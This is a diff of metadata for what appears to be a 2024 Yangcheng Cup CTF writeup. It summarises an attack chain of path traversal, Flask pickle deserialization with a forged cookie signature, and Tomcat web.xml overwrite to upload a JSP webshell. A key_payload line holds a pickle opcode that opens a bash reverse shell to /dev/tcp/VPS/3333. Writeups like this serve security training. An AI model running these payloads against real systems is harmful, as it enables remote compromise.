@@ -21,7 +21,13 @@ tags:
 - web.xml PUT/DELETE
 - base64-steghide
 - AI prompt injection
-attack_chain: '1. Lyrics For You: /lyrics 路径穿越读源码 / 2. /board pickle 反序列化 → 构造 cos.system opcode → MD5 签名伪造 cookie / 3. tomtom2: /myapp/read 任意读 tomcat-users.xml → 覆盖 web.xml 启用 PUT + .txt→jsp 映射 → 上传 jsp 马'
+attack_chain:
+- '1. Lyrics For You: /lyrics 路径穿越读源码 / 2. /board pickle 反序列化'
+- '构造 cos.system opcode'
+- 'MD5 签名伪造 cookie / 3. tomtom2: /myapp/read 任意读 tomcat-users.xml'
+- '覆盖 web.xml 启用 PUT + .txt'
+- 'jsp 映射'
+- '上传 jsp 马'
 key_payload: opcode=b'(cos\nsystem\nS'bash -c "bash -i >& /dev/tcp/VPS/3333 0>&1"'\no.' ; secret="EnjoyThePlayTime123456" ; cookie = cookie_encode(('user', opcode), secret) ; PUT /myapp/upload?path=../../../../opt/tomcat/conf 上传 web.xml
 one_liner: Flask pickle cookie + Tomcat conf 覆盖 PUT 上传 jsp。
 lesson: Tomcat conf/web.xml 覆盖 + PUT 启用 readonly=false 即可上传 .txt 当 jsp 解析。
@@ -76,6 +82,9 @@ prerequisites:
 - Tomcat conf目录结构 + DefaultServlet readonly 配置
 - Web 任意文件读漏洞利用（path traversal）
 - AI prompt injection 基础
+contest_normalized: "羊城杯"
+contest_year: 2024
+subcategory_guess: "deserialization"
 ---
 # 2024年“羊城杯”粤港澳大湾区网络安全大赛Writeup
 
